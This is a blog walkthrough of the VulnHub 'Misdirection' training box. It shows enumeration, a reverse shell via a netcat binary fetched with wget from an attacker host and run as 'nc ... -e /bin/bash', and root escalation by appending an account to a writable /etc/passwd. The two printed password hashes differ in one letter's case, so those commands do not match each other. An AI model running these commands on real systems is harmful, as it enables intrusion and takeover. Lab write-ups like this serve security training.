---
layout: post
title: "Misdirection - VulnHub"
date: 2020-07-30
ctf: true
excerpt: "Walkthrough for Misdirection on Vulnhub"
tags: [Misdirection, VulnHub, privilege escalation, website enumeration]
comments: false
---
Misdirection is labelled as a medium difficulty OSCP style box from [VulnHub]( https://www.vulnhub.com). Below are the steps I took to root this box.

First, I ran **threader3000** to see what ports were open.

![Misdirection threader3000](/assets/img/Misdirection1.png)

Next, let's run **nmap -A p- 22,80,3306,8080 [machine ip]** to further enumerate these ports.

![Misdirection nmap](/assets/img/Misdirection2.png)

It appears that we have both Apache and a Python HTTP server running, along with MySQL and SSH. Let's visit both webpages over ports 80 and 8080 and see what's going on. Over port 80, we have the following:

![Misdirection port 80 website](/assets/img/Misdirection3.png)

Over port 8080, we have a default Apache page:

![Misdirection port 8080 website](/assets/img/Misdirection4.png)

Let's take a deeper look at the one on port 80. There is a **Sign Up** link under **Log In**. Let's create an account.

![Misdirection Sign Up](/assets/img/Misdirection5.png)

Unfortunately, we receive an error when attempting to register both with and without the **Is Manager** box checked.

![Misdirection email error](/assets/img/Misdirection6.png)

A cursory glance around the rest of the site results in not finding anything that stands out. Let's run **gobuster dir -u http://[machine ip]/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php** to enumerate the website over port 80.

![Misdirection gobuster port 80](/assets/img/Misdirection7.png)

We are not able to login to the admin page as it will not load unless over https, and welcome/examples just look like they provide samples for web2py. Let's enumerate the port 8080 website next with **gobuster dir -u http://[machine ip]:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.php**.

![](/assets/img/Misdirection8.png)

After looking around, there are several subfolders available, but **/debug** provides you with web console access.

![Misdirection /debug](/assets/img/Misdirection9.png)

Running **whoami** states you are currently running as **www-data** and **sudo -l** states you can run bash as the user **brexit**

![Misdirection sudo -l](/assets/img/Misdirection10.png)

It also appears that netcat is installed. Let's open a shell on our attacker machine with **nc -nvlp 4444**

![Misdirection nc listener](/assets/img/Misdirection11.png)

Back on the p0wny@shell site, the netcat that is on the victim server does not allow for -e. Let's serve up an http server in another terminal window on our attacker machine with **python3 -m http.server**.

![Misdirection python3 http.server](/assets/img/Misdirection13.png)

On the victim machine, navigate to **cd /tmp** and run **wget http://[attacker ip]:8000/nc**. Once downloaded, run **chmod +x nc** to make this version of netcat executable. Now, run ./**nc [attacker ip] 4444 -e /bin/bash** to open a reverse shell on your attacker pc.

![Misdirection copy over nc and open reverse shell](/assets/img/Misdirection14.png)

Next, run **python -c 'import pty; pty.spawn("/bin/bash")'** to upgrade your shell.

![Misdirection upgrade shell](/assets/img/Misdirection15.png)

Now, let's run **sudo -u brexit /bin/bash**. You should now have a shell as the **brexit** user.

![Misdirection brexit user shell](/assets/img/Misdirection16.png)

Now, run **cd ~** and **ls**. The user flag is in this folder. Run **cat user.txt** to get the user flag.

![Misdirection user.txt](/assets/img/Misdirection17.png)

Now, let's copy over linpeas and pspy with **wget http://[attacker ip]:8000/linpeas.sh** and **wget http://[attacker ip]:8000/pspy64**. Next, run **chmod +x pspy64** and **chmod +x linpeas.sh**.

![Misdirection wget](/assets/img/Misdirection18.png)

Next, run **./linpeas.sh** to enumerate the server. It appears that the brexit user can write to the **/etc/passwd** file.

![Misdirection linpeas](/assets/img/Misdirection19.png)

Let's run **perl -le 'print crypt("test","aa")** to get the encrypted form of the password test we need. This should give you **aaqPiZY5xR5l.** Next, run **echo notroot:aaqPiZy5xR5l.:0:0:notroot:/root:/bin/bash >> /etc/passwd** This will add a root user named notroot with the password test. Next, run **su notroot** and enter test for the password when prompted to escalate to root.

![Misdirection root privesc](/assets/img/Misdirection20.png)

Now, just run **cd /root**, followed by **ls** and then finally **cat root.txt** to get the final flag.

![Misdirection root.txt](/assets/img/Misdirection21.png)
